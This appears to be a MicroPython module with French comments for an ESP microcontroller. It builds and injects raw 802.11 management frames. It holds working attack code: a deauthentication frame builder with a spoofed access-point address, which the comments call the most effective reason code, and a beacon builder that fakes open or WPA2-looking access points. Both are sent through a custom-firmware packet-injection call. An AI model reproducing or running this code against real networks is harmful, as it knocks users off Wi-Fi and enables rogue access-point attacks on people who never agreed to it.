import struct
import os

_seq = 0  # compteur de séquence global


def mac_bytes(mac):
    """'aa:bb:cc:dd:ee:ff' → bytes(6). Accepte aussi des bytes directement."""
    if isinstance(mac, (bytes, bytearray)):
        return bytes(mac)
    return bytes(int(x, 16) for x in mac.split(':'))


def random_mac():
    """MAC aléatoire, bit locally-administered forcé à 1 (évite les collisions réelles)."""
    b = bytearray(os.urandom(6))
    b[0] = (b[0] & 0xFE) | 0x02
    return ":".join("{:02x}".format(x) for x in b)


def _seq_ctrl():
    global _seq
    _seq = (_seq + 1) & 0xFFF
    return struct.pack('<H', _seq << 4)  # fragment=0, sequence=_seq


def build_deauth(src_mac, dst_mac, bssid, reason=7):
    """
    Trame Deauthentication 802.11 (MGMT subtype=12).
    reason=7 : Class 3 frame from nonassociated STA — le plus courant et efficace.
    """
    return (
        b'\xc0\x00'                  # FC : type=0 MGMT, subtype=12
        + b'\x00\x00'                # Duration
        + mac_bytes(dst_mac)         # Addr1 : cible (station ou broadcast)
        + mac_bytes(src_mac)         # Addr2 : émetteur spoofé (BSSID de l'AP)
        + mac_bytes(bssid)           # Addr3 : BSSID
        + _seq_ctrl()
        + struct.pack('<H', reason)  # Reason code (2 bytes LE)
    )


def build_beacon(ssid, bssid_mac, channel=6, open_ap=True):
    """
    Beacon Frame 802.11 (MGMT subtype=8).
    open_ap=True  → Capability=0x0401 (ESS, pas de confidentialité annoncée).
    open_ap=False → Capability=0x0431 (ESS + Privacy, simule du WPA2).
    """
    bssid  = mac_bytes(bssid_mac)
    ssid_b = ssid.encode() if isinstance(ssid, str) else ssid
    cap    = struct.pack('<H', 0x0401 if open_ap else 0x0431)

    ie_ssid    = bytes([0x00, len(ssid_b)]) + ssid_b
    ie_rates   = b'\x01\x08\x82\x84\x8b\x96\x0c\x12\x24\x48'  # 1,2,5.5,11,6,9,18,36 Mbps
    ie_channel = bytes([0x03, 0x01, channel])

    return (
        b'\x80\x00'        # FC : type=0 MGMT, subtype=8
        + b'\x00\x00'      # Duration
        + b'\xff' * 6      # Addr1 : broadcast
        + bssid            # Addr2 : BSSID
        + bssid            # Addr3 : BSSID
        + _seq_ctrl()
        + b'\x00' * 8      # Timestamp (mis à 0 pour simplifier)
        + b'\x64\x00'      # Beacon interval : 100 TU ≈ 102.4 ms
        + cap
        + ie_ssid
        + ie_rates
        + ie_channel
    )


def send(frame):
    """Envoie une trame 802.11 brute via esp.wifi_send_pkt_freedom (firmware custom requis)."""
    import esp
    if not hasattr(esp, 'wifi_send_pkt_freedom'):
        from lib.display import err
        err("Firmware standard — injection indisponible")
        err("Compiler le firmware custom : bash tools/build_firmware.sh")
        return False
    # esp_wifi_80211_tx exige que l'interface STA soit active et stable
    import network, utime
    wlan = network.WLAN(network.STA_IF)
    if not wlan.active():
        wlan.active(True)
        utime.sleep_ms(200)   # laisser le driver WiFi se stabiliser
    esp.wifi_send_pkt_freedom(frame, True)
    return True
